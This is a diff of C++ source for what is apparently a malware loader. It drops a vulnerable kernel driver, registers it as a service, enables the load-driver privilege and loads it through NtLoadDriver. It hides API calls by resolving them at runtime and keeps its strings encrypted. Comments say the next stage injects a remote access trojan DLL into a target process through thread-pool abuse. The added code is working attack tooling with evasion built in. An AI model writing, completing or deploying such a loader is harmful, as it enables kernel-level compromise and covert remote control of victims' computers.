@@ -5,16 +5,29 @@
 #include "resources.h"
 #include "junk_codes.h"
 
-typedef NTSTATUS (*NTAPI RtlAdjustPrivilege_t)(
+// Prototypes
+
+typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(
     ULONG Privilege,
     BOOLEAN Enable,
     BOOLEAN Client,
     PBOOLEAN WasEnabled
 );
 
-typedef NTSTATUS (*NTAPI NtLoadDriver_t)(
+typedef NTSTATUS (NTAPI *NtLoadDriver_t)(
     PUNICODE_STRING DriverServiceName
 );
+
+typedef void (NTAPI *RtlInitUnicodeString_t)(
+    PUNICODE_STRING DestinationString,
+    PCWSTR          SourceString
+);
+    
+typedef decltype(RegCreateKeyA)* RegCreateKeyA_t;
+typedef decltype(RegSetKeyValueA)* RegSetKeyValueA_t;
+typedef decltype(RegCloseKey)* RegCloseKey_t;
+
+static std::wstring to_wstring(const char*);
 
 int main(int argc, char** argv)
 {
@@ -39,21 +52,21 @@ int main(int argc, char** argv)
 #ifdef _DEBUG
         std::cerr << "Error: Could not write the vulnerable driver to disk." << std::endl;
 #endif 
+        driver_ofstream.close();
         return 1;
     }
+    driver_ofstream.close();
     wipeBytes(kph_driver);
     
     // Create the driver service keys in the registry
     HKEY dservice;
 
-
-
-    // ***************************************** TODO! - resolve the registry funcs from winapi at runtime
-
-
+    RegCreateKeyA_t RegCreateKeyA_ptr = resolve_dynamically<RegCreateKeyA_t>(str_RegCreateKeyA, str_advapi32);
+    RegSetKeyValueA_t RegSetKeyValueA_ptr = resolve_dynamically<RegSetKeyValueA_t>(str_RegSetKeyValueA, str_advapi32);
+    RegCloseKey_t RegCloseKey_ptr = resolve_dynamically<RegCloseKey_t>(str_RegCloseKey, str_advapi32);
 
     std::string servicesPath = decrypt_string(str_servicesPath);
-    LSTATUS status = RegCreateKeyA(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice);
+    LSTATUS status = RegCreateKeyA_ptr(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice);
     wipeStr(servicesPath);
     if (status != ERROR_SUCCESS)
     {
@@ -65,7 +78,7 @@ int main(int argc, char** argv)
 
     std::string imagePath = decrypt_string(str_ImagePath);
     std::string driverNtPath = decrypt_string(str_kphDriverNtPath);
-    status = RegSetKeyValueA(dservice, NULL, imagePath.c_str(), REG_EXPAND_SZ, driverNtPath.c_str(), driverNtPath.size() + 1);
+    status = RegSetKeyValueA_ptr(dservice, NULL, imagePath.c_str(), REG_EXPAND_SZ, driverNtPath.c_str(), (DWORD)(driverNtPath.size() + 1));
     wipeStr(kphDriverDesiredPath);
     wipeStr(imagePath);
     if (status != ERROR_SUCCESS)
@@ -78,7 +91,7 @@ int main(int argc, char** argv)
 
     DWORD ServiceTypeKernel = 1;
     std::string type = decrypt_string(str_Type);
-    status = RegSetKeyValueA(dservice, NULL, type.c_str(), REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
+    status = RegSetKeyValueA_ptr(dservice, NULL, type.c_str(), REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
     wipeStr(type);
     if (status != ERROR_SUCCESS)
     {
@@ -88,19 +101,69 @@ int main(int argc, char** argv)
         return 1;
     }
 
-    RegCloseKey(dservice);
+    RegCloseKey_ptr(dservice);
 
-   
     // Enable SE_LOAD_DRIVER_PRIVILIGE via RtlAdjustPrivilige()
+    RtlAdjustPrivilege_t RtlAdjustPrivilege_ptr = resolve_dynamically<RtlAdjustPrivilege_t>(str_RtlAdjustPrivilege, str_ntdll);
+    ULONG SE_LOAD_DRIVER_PRIVILIGE = 10ul;
+    BOOLEAN SeLoadDriverWasEnabled;
+
+    NTSTATUS ntStatus = RtlAdjustPrivilege_ptr(SE_LOAD_DRIVER_PRIVILIGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
+    if (!(ntStatus >= 0)) // if not success
+    {
+#ifdef _DEBUG
+        std::cerr << "Fatal Error: Failed to accuire SE_LOAD_DRIVER_PRIVILEGE" << std::endl;
+#endif 
+        return 1;
+    }
+    
+    // Prepare for NtLoadDriver() call
+    NtLoadDriver_t NtLoadDriver_ptr = resolve_dynamically<NtLoadDriver_t>(str_NtLoadDriver, str_ntdll);
+    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = resolve_dynamically<RtlInitUnicodeString_t>(str_RtlInitUnicodeString, str_ntdll);
+    UNICODE_STRING dserviceRegPathUnicodeString;
+    std::string decryptedServiceRegPath = decrypt_string(str_serviceRegStr);
+
+    std::wstring wideServiceRegPath = to_wstring(decryptedServiceRegPath.c_str());
+    wipeStr(decryptedServiceRegPath);
+    
+    RtlInitUnicodeString_ptr(&dserviceRegPathUnicodeString, wideServiceRegPath.c_str());
+
     // Call NtLoadDriver()
+    ntStatus = NtLoadDriver_ptr(&dserviceRegPathUnicodeString);
 
-    ULONG SE_LOAD_DRIVER_PRIVILIGE = 10UL;
-    bool SeLoadDriverWasEnabled;
-    NTSTATUS status; // = RtlAdjustPrivilige();
+    // Do some cleaning
+    SecureZeroMemory(&dserviceRegPathUnicodeString, sizeof(dserviceRegPathUnicodeString));
+    SecureZeroMemory(&wideServiceRegPath[0], wideServiceRegPath.size() * sizeof(wchar_t));
+    wideServiceRegPath.clear();
 
-    // Inject the RAT dll to the target process's virtual memory (after performing relocations)
+    if (ntStatus == 0xC0000603) // STATUS_IMAGE_CERT_REVOKED
+    {   
+#ifdef _DEBUG
+        std::cerr << "Fatal Error: Couldn't load the driver because it has been blocked!\nError Code: 0x" << std::hex << ntStatus << "\nReason: STATUS_IMAGE_CERT_REVOKED" << std::endl;
+#endif 
+        return 1;
+    }
+
+    else if (ntStatus == 0xC0000022 || ntStatus == 0xC000009A) // STATUS_ACCESS_DENIED and STATUS_INSUFFICIENT_RESOURCES
+    {
+#ifdef _DEBUG
+        std::cerr << "Fatal Error: Couldn't load the driver due to Access Denied or Insufficient Resources!\nError Code: 0x" << std::hex << ntStatus << std::endl;
+#endif
+        return 1;
+    }
+
+    // Inject the RAT dll to the target process's virtual memory (after applying relocations)
 
     // Execute the AddressOfEntryPoint of the dll in the target process via abusing Thread pools (PoolParty)
-    
 	return 0;
+}
+
+static std::wstring to_wstring(const char* narrowStr)
+{
+    size_t len = strlen(narrowStr) + 1;
+    std::wstring wideStr(len, L'\0');
+    mbstowcs_s(nullptr, &wideStr[0], len, narrowStr, len - 1); // Convert string
+    wideStr.resize(len - 1); // Trim trailing null character
+
+    return wideStr;
 }
